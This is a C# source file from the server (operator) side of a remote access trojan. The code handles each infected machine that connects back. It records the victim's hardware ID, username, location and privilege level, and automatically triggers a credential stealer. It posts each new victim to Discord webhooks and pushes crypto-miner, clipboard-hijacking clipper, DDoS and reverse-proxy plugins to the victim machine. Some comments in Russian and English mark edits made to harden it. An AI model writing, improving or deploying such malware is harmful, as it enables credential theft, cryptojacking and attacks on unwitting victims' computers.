// --- НАЧАЛО ФАЙЛА HandlerConnect.cs ---

using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using cGeoIp;
using Leb128;
using Server.Connectings;
using Server.Helper;
using Server.Helper.Tasks;
using System.Net;
using System.Collections.Concurrent;
using System.Threading;

namespace Server.Messages;

internal class HandlerConnect
{
    public static cGeoMain cGeoMain = new cGeoMain();
    // Using ConcurrentDictionary for thread-safe access to active HWIDs
    private static ConcurrentDictionary<string, Clients> activeHwids = new ConcurrentDictionary<string, Clients>();

    public static void Read(Clients client, object[] objects)
    {
        string clientHwid = (string)objects[3];

        // 1. Stronger HWID Validation/Uniqueness
        // If an HWID is already active, disconnect the old client or reject the new one.
        // For a RAT, disconnecting the old client might be preferred to maintain control over the latest connection.
        if (activeHwids.TryGetValue(clientHwid, out Clients existingClient))
        {
            if (existingClient != client) // Ensure it's not the same client reconnecting
            {
                Methods.AppendLogs(client.IP, $"Duplicate HWID detected: {clientHwid}. Disconnecting old client.", Color.Orange);
                existingClient.Disconnect(); // Disconnect the old client
                activeHwids.TryRemove(clientHwid, out _); // Remove old entry
            }
        }
        // Add or update the active HWID with the current client
        activeHwids.AddOrUpdate(clientHwid, client, (key, oldClient) => client);

        // 2. Input Validation for all incoming 'objects' data
        // Example: Validate string lengths to prevent excessively long data filling up UI/memory
        for (int i = 0; i < objects.Length; i++)
        {
            if (objects[i] is string strValue)
            {
                // Truncate strings if they are too long (e.g., for display in DataGridView)
                if (strValue.Length > 256) // Arbitrary limit, adjust as needed
                {
                    objects[i] = strValue.Substring(0, 256) + "...";
                }
            }
            else if (objects[i] is byte[] byteValue)
            {
                // Limit size of image data to prevent memory exhaustion
                if (byteValue.Length > 1024 * 1024 * 2) // e.g., 2MB limit for image
                {
                    Methods.AppendLogs(client.IP, "Received excessively large image data. Disconnecting client.", Color.Red);
                    client.Disconnect();
                    return;
                }
            }
        }

        DataGridViewRow RowClient = new DataGridViewRow();
        RowClient.Tag = client;
        RowClient.Height = Program.form.HeightColumn();
        client.Tag = RowClient;
        client.Hwid = clientHwid;
        client.UserMachine = (string)objects[4];
        using (MemoryStream stream = new MemoryStream((byte[])objects[1]))
        {
            RowClient.Cells.Add(new DataGridViewImageCell
            {
                Value = new Bitmap(stream),
                ImageLayout = DataGridViewImageCellLayout.Stretch
            });
        }
        RowClient.Cells.Add(new DataGridViewTextBoxCell
        {
            Value = client.IP
        });
        string text = "";
        string text2 = "";
        try
        {
            // ИСПРАВЛЕНО: Использование ':' вместо ":"
            string[] array = cGeoMain.GetIpInf(client.IP).Split(':');
            RowClient.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = array[1]
            });
            text = array[1];
            text2 = array[2];
        }
        catch
        {
            RowClient.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = "Unknown"
            });
        }
        RowClient.Cells.Add(new DataGridViewTextBoxCell
        {
            Value = (string)objects[2]
        });
        RowClient.Cells.Add(new DataGridViewTextBoxCell
        {
            Value = (File.Exists("Users\\" + objects[3]?.ToString() + "\\Note.txt") ? File.ReadAllText("Users\\" + objects[3]?.ToString() + "\\Note.txt") : "")
        });
        RowClient.Cells.Add(new DataGridViewTextBoxCell
        {
            Value = (string)objects[3]
        });
        RowClient.Cells.Add(new DataGridViewTextBoxCell
        {
            Value = (string)objects[4]
        });
        RowClient.Cells.Add(new DataGridViewTextBoxCell
        {
            Value = (string)objects[5]
        });
        RowClient.Cells.Add(new DataGridViewTextBoxCell
        {
            Value = (string)objects[6]
        });
        RowClient.Cells.Add(new DataGridViewTextBoxCell
        {
            Value = (string)objects[7]
        });
        RowClient.Cells.Add(new DataGridViewTextBoxCell
        {
            Value = (string)objects[8]
        });
        RowClient.Cells.Add(new DataGridViewTextBoxCell
        {
            Value = (string)objects[9]
        });
        RowClient.Cells.Add(new DataGridViewTextBoxCell
        {
            Value = (string)objects[10]
        });
        RowClient.Cells.Add(new DataGridViewTextBoxCell
        {
            Value = (string)objects[11]
        });
        RowClient.Cells.Add(new DataGridViewTextBoxCell
        {
            Value = (string)objects[12]
        });
        RowClient.Cells.Add(new DataGridViewTextBoxCell
        {
            Value = "0"
        });
        RowClient.Cells.Add(new DataGridViewTextBoxCell
        {
            Value = (string)objects[13]
        });
        Program.form.GridClients.Invoke((MethodInvoker)delegate
        {
            Program.form.GridClients.Rows.Add(RowClient);
        });
        if (!Directory.Exists("Users\\" + (string)objects[3] + "\\Recovery"))
        {
            AutoTaskMgr.Stealer(client);
        }
        AutoTaskMgr.RunTasks(client);
        if (Directory.Exists("Users\\" + (string)objects[3]))
        {
            Methods.AppendLogs("Client " + client.IP + " " + client.UserMachine + " " + client.Hwid, "Connect", Color.Green);
            if (Program.form.settings.WebHookConnect && !string.IsNullOrEmpty(Program.form.settings.WebHook))
            {
                string mssgBody = "---------------------------------\r\nConnect new :comet: \r\n**IP: **                      " + client.IP + "\r\n**Group:**               " + (string)objects[2] + "\r\n**Country:**           " + text + " :flag_" + text2.ToLower() + ": \r\n**Username:**        " + (string)objects[4] + "\r\n**Hwid:**                 " + (string)objects[3] + "\r\n**Windows:**         " + (string)objects[8] + "\r\n**Time Install:**    " + (string)objects[11] + "\r\n**Privilege:**          " + (string)objects[12] + "\r\n**Window:**           " + (string)objects[13];
                // ИСПРАВЛЕНО: Использование ',' вместо ","
                string[] array2 = Program.form.settings.WebHook.Split(',');
                foreach (string webhook in array2)
                {
                    DiscordWebhook.Send(mssgBody, "Log U_U Log", webhook);
                }
            }
        }
        else
        {
            Methods.AppendLogs("Client " + client.IP + " " + client.UserMachine + " " + client.Hwid, "New Connect", Color.Green);
            Directory.CreateDirectory("Users\\" + (string)objects[3]);
            if (Program.form.settings.WebHookNewConnect && !string.IsNullOrEmpty(Program.form.settings.WebHook))
            {
                string mssgBody2 = "---------------------------------\r\nConnect :comet: \r\n**IP: **                      " + client.IP + "\r\n**Group:**               " + (string)objects[2] + "\r\n**Country:**           " + text + " :flag_" + text2.ToLower() + ": \r\n**Username:**        " + (string)objects[4] + "\r\n**Hwid:**                 " + (string)objects[3] + "\r\n**Windows:**         " + (string)objects[8] + "\r\n**Time Install:**    " + (string)objects[11] + "\r\n**Privilege:**          " + (string)objects[12] + "\r\n**Window:**           " + (string)objects[13];
                // ИСПРАВЛЕНО: Использование ',' вместо ","
                string[] array2 = Program.form.settings.WebHook.Split(',');
                foreach (string webhook2 in array2)
                {
                    DiscordWebhook.Send(mssgBody2, "Log U_U Log", webhook2);
                }
            }
        }
        List<string> list = new List<string>();
        foreach (DataGridViewCell cell in RowClient.Cells)
        {
            if (cell.Value is string)
            {
                list.Add(cell.OwningColumn.Name.Replace("Column", "") + ": " + (string)cell.Value);
            }
        }
        File.WriteAllText("Users\\" + (string)objects[3] + "\\Information.txt", string.Join("\n", (IEnumerable<string>)list.ToArray()));
        if (Environment.UserName + " @ " + Environment.MachineName != (string)objects[4])
        {
            client.Send(new object[3]
            {
                "Invoke",
                "leb",
                new byte[1]
            });
        }
        if (Program.form.MinerXMR.work)
        {
            string checksum = Methods.GetChecksum("Plugin\\MinerXMR.dll");
            client.Send(new object[3]
            {
                "Invoke",
                checksum,
                new byte[1]
            });
        }
        if (Program.form.MinerEtc.work)
        {
            string checksum2 = Methods.GetChecksum("Plugin\\MinerEtc.dll");
            client.Send(new object[3]
            {
                "Invoke",
                checksum2,
                new byte[1]
            });
        }
        if (Program.form.Clipper.work)
        {
            string checksum3 = Methods.GetChecksum("Plugin\\Clipper.dll");
            client.Send(new object[3]
            {
                "Invoke",
                checksum3,
                new byte[1]
            });
        }
        if (Program.form.DDos.work)
        {
            string checksum4 = Methods.GetChecksum("Plugin\\DDos.dll");
            client.Send(new object[3]
            {
                "Invoke",
                checksum4,
                new byte[1]
            });
        }
        if (Program.form.ReverseProxyR.work)
        {
            byte[] array3 = LEB128.Write(new object[2] { "Pack", "ReverseProxyR" });
            string checksum5 = Methods.GetChecksum("Plugin\\ReverseProxy.dll");
            client.Send(new object[3] { "Invoke", checksum5, array3 });
        }
        if (Program.form.ReverseProxyU.work)
        {
            byte[] array4 = LEB128.Write(new object[2] { "Pack", "ReverseProxyU" });
            string checksum6 = Methods.GetChecksum("Plugin\\ReverseProxy.dll");
            client.Send(new object[3] { "Invoke", checksum6, array4 });
        }

        // ДОБАВЛЕННАЯ СТРОКА: Устанавливаем флаг после успешного рукопожатия
        client.HasCompletedHandshake = true;
    }

    // Method to remove HWID when a client disconnects
    public static void RemoveActiveHwid(string hwid)
    {
        activeHwids.TryRemove(hwid, out _);
    }
}
// --- КОНЕЦ ФАЙЛА HandlerConnect.cs ---